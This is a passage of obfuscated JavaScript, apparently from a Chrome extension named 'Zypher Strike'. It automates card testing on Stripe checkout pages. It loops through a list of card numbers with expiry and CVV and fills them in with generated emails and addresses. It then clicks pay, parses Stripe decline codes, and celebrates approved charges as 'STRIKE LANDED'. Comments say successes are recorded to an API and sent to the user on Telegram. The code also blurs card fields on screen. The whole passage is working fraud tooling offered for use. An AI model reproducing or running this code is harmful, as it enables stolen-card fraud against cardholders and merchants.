 const dismiss=()=>{c.classList.add('out');setTimeout(()=>c.remove(),240);document.querySelectorAll('.zs-fx,.zs-fx-flash,.zs-fx-strike,.zs-fx-banner').forEach(el=>el.remove());};
 c.addEventListener('click',dismiss);
 document.body.appendChild(c);
 if(variant==='success'){try{_zsCelebrate();}catch(_){}try{_zsCongratsBottom(meta);}catch(_){}}
 setTimeout(dismiss,life);
}
function showSuccessBanner(card){
 const num=(card&&card.num)?String(card.num).replace(/\s/g,''):'';
 const last4=num.slice(-4);
 const bin=num.slice(0,6);
 const meta=[];
 if(bin)meta.push('BIN '+bin);
 if(last4)meta.push('•••• '+last4);
 if(card&&card._t)meta.push(card._t);
 showZsToast({variant:'success',status:'STRIKE LANDED',title:'STRIKE! ⚡⚡⚡',meta:meta,life:6500});
}
function showAttemptBanner(card, idx) {
 document.querySelectorAll('#cf-attempt-banner').forEach(e=>e.remove());
 const b = document.createElement('div');
 b.id = 'cf-attempt-banner';
 b.style.cssText = 'position:fixed!important;top:0!important;left:0!important;right:0!important;z-index:2147483646!important;background:#0d2b1e!important;border-bottom:2px solid #10b981!important;padding:8px 14px!important;display:flex!important;align-items:center!important;gap:10px!important;font-family:monospace!important;animation:cfSlideDown .2s ease!important;';
 if(!document.getElementById('cf-attempt-style')){
 const s=document.createElement('style');
 s.id='cf-attempt-style';
 s.textContent='@keyframes cfSlideDown{from{transform:translateY(-100%)}to{transform:translateY(0)}}';
 document.head.appendChild(s);
 }
 const icon = document.createElement('div');
 icon.style.cssText = 'width:32px!important;height:32px!important;background:#111!important;border:1px solid #1e3a2e!important;border-radius:6px!important;display:flex!important;align-items:center!important;justify-content:center!important;font-size:16px!important;flex-shrink:0!important;';
 icon.textContent = '💳';
 const info = document.createElement('div');
 info.style.cssText = 'flex:1!important;min-width:0!important;';
 info.innerHTML = '<div style="font-size:8px!important;color:#34d399!important;font-weight:700!important;letter-spacing:.5px!important;margin-bottom:2px!important">ATTEMPT: '+(idx+1)+'</div>'+
 '<div style="font-size:10px!important;color:#e2e8f0!important;font-weight:600!important;letter-spacing:.5px!important;white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important">'+
 card.num+'|'+card.expiry.replace('/','|')+'|'+card.cvv+'</div>';
 const copy = document.createElement('button');
 copy.style.cssText = 'background:#1a3a2a!important;border:1px solid #1e3a2e!important;border-radius:5px!important;color:#34d399!important;padding:4px 8px!important;cursor:pointer!important;font-size:9px!important;flex-shrink:0!important;';
 copy.textContent = '⧉';
 copy.onclick = () => { navigator.clipboard?.writeText(card.num+'|'+card.expiry+'|'+card.cvv); };
 b.appendChild(icon);
 b.appendChild(info);
 b.appendChild(copy);
 document.body.appendChild(b);
}
function hideAttemptBanner() {
 document.querySelectorAll('#cf-attempt-banner').forEach(e=>e.remove());
}
function maskEmailField() {
 const _0x90ed0vmir = document.querySelector('input[type="email"],input[name*="email"],input[placeholder*="email" i],input[autocomplete="email"]');
 if (!_0x90ed0vmir) return;
 document.querySelectorAll('#cf-email-mask').forEach(e=>e.remove());
 const r = _0x90ed0vmir.getBoundingClientRect();
 if(r.width<5) return;
 const bg = (() => {
 let el=_0x90ed0vmir.parentElement;
 while(el&&el!==document.body){const s=getComputedStyle(el);if(s.backgroundColor&&s.backgroundColor!=='rgba(0, 0, 0, 0)')return s.backgroundColor;el=el.parentElement;}
 return '#1a1a1a';
 })();
 const m = document.createElement('div');
 m.id = 'cf-email-mask';
 m.setAttribute('data-cf-mask','1');
 Object.assign(m.style,{
 position:'fixed',top:r.top+'px',left:r.left+'px',
 width:r.width+'px',height:r.height+'px',
 background:bg,zIndex:'2147483640',
 display:'flex',alignItems:'center',justifyContent:'center',
 pointerEvents:'none',fontFamily:"'Courier New',monospace",
 fontSize:'12px',color:'rgba(255,255,255,0.15)',letterSpacing:'3px',
 });
 m.textContent = '● ● ● ● ● ● ● ● ●';
 document.body.appendChild(m);
}
async function startAP(){
 await zsLoadUser();
 if(!cards.length){toast('warn','No cards loaded');return;}
 if(apOn){toast('warn','Already running');return;}
 if(!hasForm()){toast('warn','No checkout form detected');return;}
 if(_0xba346ejgx.length < 3){
 toast('info','⏳ Loading addresses...');
 await prefetchAddrs();
 }
 apOn=true;apIdx=0;apResults=[];
 document.getElementById('cf-ap-start').style.display='none';
 document.getElementById('cf-ap-stop').style.display='block';
 document.getElementById('cf-ap-stat').className='cf-ap-stat running';
 document.getElementById('cf-ap-stat').textContent=`Running — ${cards.length} cards`;
 document.getElementById('cf-status-val').textContent='Running';
 cards.forEach(c=>{delete c.result;delete c.reason;});
 saveCards();renderCards();
 processNext();
}
function stopAP(){
 apOn=false;if(apTimer)clearTimeout(apTimer);
 hideAttemptBanner();removeMasks();
 document.getElementById('cf-ap-start').style.display='block';
 document.getElementById('cf-ap-stop').style.display='none';
 document.getElementById('cf-ap-stat').className='cf-ap-stat idle';
 document.getElementById('cf-ap-stat').innerHTML=`Stopped at card ${apIdx}`;
 toast('warn','AutoPilot stopped');
}
async function processNext(){
 if(!apOn)return;
 const max=parseInt(document.getElementById('cf-max').value)||15;
 if(apIdx>=cards.length||apIdx>=max){finishAP();return;}
 const card=cards[apIdx];
 document.querySelectorAll('.cf-ci').forEach(el=>{
 el.classList.remove('cf-cur');
 if(el.id==='cfc-'+card.id){el.classList.add('cf-cur');el.scrollIntoView({behavior:'smooth',block:'nearest'});}
 });
 updateProg();
 _0x633cdxf2w=null;
 const _0xb503ux1gn=Date.now();
 showAttemptBanner(card, apIdx);
 applyMasks();
 maskEmailField();
 if(!card._hkEmail){const _hk=_HK_FB.gen();card._hkEmail=_hk.email;}
 defuseStripeLink(card._hkEmail);
 const _0x1574s9li2 = document.querySelector('input[type="email"],input[name*="email"],input[autocomplete="email"],input[placeholder*="email" i]');
 if (_0x1574s9li2 && vis(_0x1574s9li2)) {
 setV(_0x1574s9li2, card._hkEmail);
 }
 fillCard(card);
 await sleep(800);
 if(card.address){tryF('addr',card.address);tryF('city',card.city);}
 if(card.name)tryF('name',card.name);
 clickPay();
 const _reClick=setTimeout(()=>{try{const b=findPayBtn();if(b){b.click();forceClick(b);}}catch(_){}},5000);
 await sleep(200);
 const _0x57f6opua8 = document.body.innerText;
 let _0x781479ddf=null;
 const _0x75ed9imvu=30000;
 let _0x4a3ctygr7=0;
 while(_0x4a3ctygr7<_0x75ed9imvu){
 await sleep(350);_0x4a3ctygr7+=350;
 if(_0x633cdxf2w&&pmResultTime>_0xb503ux1gn){_0x781479ddf=_0x633cdxf2w;break;}
 const dom=getState();
 if(dom.state==='_0x7be1923ax'){
 logAP('err','Session _0x7be1923ax');
 stopAP();
 return;
 }
 if(dom.state==='success'){_0x781479ddf=dom;break;}
 if(dom.state==='error' && document.body.innerText!==_0x57f6opua8){_0x781479ddf=dom;break;}
 }
 clearTimeout(_reClick);
 if(!_0x781479ddf){_0x781479ddf={state:'error',msg:'timeout'};}
 if(_0x781479ddf.state==='success'){
 card.result='success';card.reason=_0x781479ddf.msg;
 const _t0s=((Date.now()-_0xb503ux1gn)/1000).toFixed(2)+'s';
 logAP('ok',`${card.num}|${card.expiry.replace('/','|')}|${card.cvv}`,_t0s,'approved');
 saveCards();renderCards();
 zsRecordSuccess(card); // ← record to API + notify user on Telegram
 notify('⚡ Zypher Strike — STRIKE LANDED',`${card.num} — CHARGED ✅`);
 toast('ok','✅ HIT! Payment Successful!');
 hideAttemptBanner();
 showSuccessBanner(card);
 removeMasks();
 finishAP(true);
 } else {
 const reason=_0x781479ddf.msg||'Declined';
 card.result='failed';card.reason=reason;
 const _t0e=((Date.now()-_0xb503ux1gn)/1000).toFixed(2)+'s';
 logAP('err',`${card.num}|${card.expiry.replace('/','|')}|${card.cvv}`,_t0e,reason);
 toast('err',`❌ ${reason}`);
 saveCards();renderCards();
 apIdx++;
 apTimer=setTimeout(()=>{
 if(!apOn)return;
 const next=cards[apIdx];
 if(next){const el=document.getElementById('cfc-'+next.id);if(el)el.scrollIntoView({behavior:'smooth',block:'nearest'});}
 processNext();
 },1500);
 }
}
function finishAP(success=false){
 apOn=false;if(apTimer)clearTimeout(apTimer);
 hideAttemptBanner();removeMasks();
 document.getElementById('cf-ap-start').style.display='block';
 document.getElementById('cf-ap-stop').style.display='none';
 const ok=cards.filter(c=>c.result==='success').length;
 const fail=cards.filter(c=>c.result==='failed').length;
 const stat=document.getElementById('cf-ap-stat');
 if(success){stat.className='cf-ap-stat done-ok';stat.textContent=`✅ Success! ${ok} worked, ${fail} failed`;}
 else{stat.className='cf-ap-stat done-fail';stat.textContent=`❌ Done: ${fail} failed, none worked`;}
 if(!success)notify('❌ AutoPilot Done',`All ${fail} cards failed`);
 document.getElementById('cf-prog').style.width='100%';
}
function updateProg(){
 const max=Math.min(cards.length,parseInt(document.getElementById('cf-max').value)||15);
 const pct=Math.round((apIdx/max)*100);
 document.getElementById('cf-prog').style.width=pct+'%';
 document.getElementById('cf-prog-txt').textContent=`${apIdx} / ${max}`;
}
function logAP(type, cardStr, time, reason){
 const el=document.getElementById('cf-log');if(!el)return;
 const ph=el.querySelector('span');if(ph)ph.remove();
 const d=document.createElement('div');
 const isOk=type==='ok';
 d.style.cssText='display:flex;justify-content:space-between;align-items:baseline;padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.04);';
 d.innerHTML=
 '<span style="color:#475569;font-family:monospace;font-size:8px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+cardStr+'</span>'+
 '<span style="color:'+(isOk?'#34d399':'#f87171')+';font-weight:700;font-size:8.5px;margin:0 8px;flex-shrink:0">'+reason+'</span>'+
 '<span style="color:#334155;font-size:8px;flex-shrink:0">'+time+'</span>';
 el.appendChild(d);
 el.scrollTop=el.scrollHeight;
}
function notify(title,body){
 chrome.runtime.sendMessage({action:'notify',title,body});
}
function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
let _0x633cdxf2w=null, pmResultTime=0;
window.addEventListener('message',(event)=>{
 try{
 const raw=typeof event.data==='string'?event.data:JSON.stringify(event.data);
 if(!raw)return;
 const succ=[/paymentIntent.*status.*succeeded/i,/setupIntent.*status.*succeeded/i,/"status"\s*:\s*"succeeded"/i,/payment_intent\.succeeded/i,/"paid"\s*:\s*true/i];
 const _0xc896ntmp8=[
 {p:/generic_decline/i,m:'Generic Decline'},{p:/card_declined/i,m:'Card Declined'},
 {p:/do_not_honor/i,m:'Do Not Honor'},{p:/insufficient_funds/i,m:'Insufficient Funds'},
 {p:/lost_card/i,m:'Lost Card'},{p:/stolen_card/i,m:'Stolen Card'},
 {p:/expired_card/i,m:'Card Expired'},{p:/incorrect_cvc/i,m:'Incorrect CVC'},
 {p:/incorrect_number/i,m:'Incorrect Number'},{p:/invalid_expiry/i,m:'Invalid Expiry'},
 {p:/fraudulent/i,m:'Flagged as Fraud ⚠'},{p:/card_not_supported/i,m:'Card Not Supported'},
 {p:/pickup_card/i,m:'Card Blocked'},{p:/restricted_card/i,m:'Restricted Card'},
 {p:/authentication_required/i,m:'3DS Required 🔐'},{p:/card_velocity_exceeded/i,m:'Too Many Attempts'},
 {p:/processing_error/i,m:'Processing Error'},{p:/address_zip_mismatch/i,m:'ZIP Mismatch'},
 {p:/"decline_code"\s*:\s*"([^"]+)"/i,m:null,extract:true},
 ];
 for(const sp of succ){if(sp.test(raw)){_0x633cdxf2w={state:'success',msg:'Payment Successful 🎉'};pmResultTime=Date.now();return;}}
 for(const dc of _0xc896ntmp8){
 if(dc.p.test(raw)){
 if(dc.extract){const m=raw.match(/"decline_code"\s*:\s*"([^"]+)"/i);if(m){_0x633cdxf2w={state:'error',msg:m[1].replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase())};pmResultTime=Date.now();}}
 else{_0x633cdxf2w={state:'error',msg:dc.m};pmResultTime=Date.now();}
 return;
 }
 }
 if(/"error"/i.test(raw)&&/"message"\s*:\s*"([^"]+)"/i.test(raw)){
 const m=raw.match(/"message"\s*:\s*"([^"]+)"/i);
 if(m&&m[1].length>3){_0x633cdxf2w={state:'error',msg:m[1].substring(0,60)};pmResultTime=Date.now();}
 }
 }catch(_){}
},true);
const _0xa5c4fryfw = 'stripe-auto-blurred';
let _0x140fscjha = false;
let _0xed73p4fbc = null;
const _0x5350dq6s2 = ['card number', 'security code', 'expiration', 'cvc', 'cvv'];
const _0xea90oy7re = [
 'input[type="email"]',
 'input[name="email"]',
 'input[name="cardnumber"]',
 'input[autocomplete="cc-number"]',
 'input[name="cvc"]',
 'input[autocomplete="cc-csc"]',
 'input[name="exp-date"]',
 'input[autocomplete="cc-exp"]',
];
function injectBlurCSS(){
 if(document.getElementById('cf-blur-style'))return;
 const style=document.createElement('style');
 style.id='cf-blur-style';
 style.textContent=`.${_0xa5c4fryfw}{filter:blur(6px)!important;transition:filter 0.2s ease;border-radius:4px;}`;
 (document.head||document.documentElement).appendChild(style);
}
function blurElement(el){
 if(!el.classList.contains(_0xa5c4fryfw))el.classList.add(_0xa5c4fryfw);
}
function applyBlur(){
 _0xea90oy7re.forEach(sel=>{
 try{ document.querySelectorAll(sel).forEach(el=>blurElement(el)); }catch(e){}
 });
 document.querySelectorAll('p, span, div').forEach(el=>{
 const text=el.innerText||'';
 const _0xd50c696ne=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text.trim());
 const _0x4d6c7zvbn=el.children.length===0;
 if(_0xd50c696ne&&_0x4d6c7zvbn)blurElement(el);
 });
 document.querySelectorAll('iframe').forEach(iframe=>{
 const title=(iframe.title||'').toLowerCase();
 const name=(iframe.name||'').toLowerCase();
 const _0x57e2zsngd=_0x5350dq6s2.some(t=>title.includes(t));
 const _0x5badkbf76=name.includes('privatestripeframe')&&
 (title.includes('card')||title.includes('cvc')||title.includes('expir')||title.includes('security'));
 if(_0x57e2zsngd||_0x5badkbf76)blurElement(iframe);
 });
}
function applyMasks(){
 injectBlurCSS();
 _0x140fscjha=true;
 applyBlur();
 if(!_0xed73p4fbc){
 _0xed73p4fbc=new MutationObserver(()=>{ if(_0x140fscjha)applyBlur(); });
 _0xed73p4fbc.observe(document.body,{childList:true,subtree:true});
 }
 [500,1000,2000,3000].forEach(d=>setTimeout(()=>{ if(_0x140fscjha)applyBlur(); },d));
}
function removeMasks(){
 _0x140fscjha=false;
 if(_0xed73p4fbc){_0xed73p4fbc.disconnect();_0xed73p4fbc=null;}
 document.querySelectorAll('.'+_0xa5c4fryfw).forEach(el=>el.classList.remove(_0xa5c4fryfw));
}
function updateMaskPos(){ }
chrome.runtime.onMessage.addListener((msg) => {
 if (msg.action === 'toggleBlur') {
 if (msg.enabled) applyMasks();
 else removeMasks();
 }
});
if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',buildWidget);}
else{buildWidget();}
let _linkDefused=false;
async function defuseStripeLink(email){
 if(_linkDefused)return;
 const onStripe=location.hostname.includes('checkout.stripe.com')||location.hostname.includes('buy.stripe.com');
 if(!onStripe)return;
 const sels=['input[type="email"]','input[name="email"]','input[autocomplete="email"]','input[id*="email" i]','input[placeholder*="email" i]'];
 for(let i=0;i<8;i++){
 for(const s of sels){const el=document.querySelector(s);if(el&&vis(el)){_linkDefused=true;setV(el,email);el.dispatchEvent(new Event('blur',{bubbles:true}));return;}}
 await sleep(100);
 }
}
(function autoBlurOnStripe(){
 const url=window.location.href;
 const _0x1a09sg5ha=url.includes('checkout.stripe.com')||url.includes('buy.stripe.com');
 if(!_0x1a09sg5ha)return;
 injectBlurCSS();
 applyBlur();
 [500,1000,2000,3000].forEach(d=>setTimeout(applyBlur,d));
 const obs=new MutationObserver(applyBlur);
 const _0x4318ljmuz=()=>{
 if(document.body){obs.observe(document.body,{childList:true,subtree:true});}
 else{setTimeout(_0x4318ljmuz,50);}
 };
 _0x4318ljmuz();
 (async()=>{const hk=_HK_FB.gen();await defuseStripeLink(hk.email);})();
})();
window.addEventListener('scroll',updateMaskPos,true);
window.addEventListener('resize',updateMaskPos);